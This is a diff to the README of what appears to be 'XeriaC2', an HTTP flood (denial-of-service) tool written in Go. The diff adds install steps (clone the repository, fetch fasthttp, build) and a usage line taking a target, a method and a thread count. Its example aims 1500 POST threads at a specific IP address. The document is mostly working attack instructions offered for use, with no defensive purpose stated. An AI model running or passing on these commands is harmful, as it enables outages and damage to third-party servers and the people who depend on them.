@@ -18,14 +18,23 @@ cd XeriaC2
 ----
 WANNA USE HTTP-FLOOD.go?
 STEP BY STEP :
-INSTALL : 
+## INSTALL : 
+
 https://github.com/levanderdev/XeriaC2
+
 cd XeriaC2
+
 go mod init http 
+
 go get github.com/valyala/fasthttp
 go build 
+
 ./http
-----
+
+## USAGE : 
+./http <target> <GET/POST> <threads>
+example: ./http http://51.159.30.249 POST 1500
+
 
 Methods : 
 
